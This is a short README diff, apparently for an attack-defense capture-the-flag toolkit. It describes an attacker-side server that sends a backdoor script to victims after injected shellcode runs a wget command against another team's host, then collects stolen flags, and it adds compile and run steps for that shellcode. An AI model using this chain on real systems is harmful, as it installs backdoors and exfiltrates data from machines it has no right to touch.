@@ -15,4 +15,10 @@ $python server.py
 
 server.py will begin listening on port 8888 and is meant to be run on the attacker's machine. Assuming a shellcode with the command 'wget team2:8080//vuln' is injected into a vulnerable service, server.py will begin sending our malicious backdoor.sh to the victim machine, effectively installing it on their machine. Next, server.py will beginning waiting for HTTP GET requests that contain flags in the URI. server.py will then parse it and submit the flags. 
 
+To run the shellcode
+---------------------
+$./a.out
 
+To compile simply run 'gcc -m32 shellcode.s'
+
+This shellcode will perform the installation an execve of /bin/wget and our necessary arguments (can be changed)
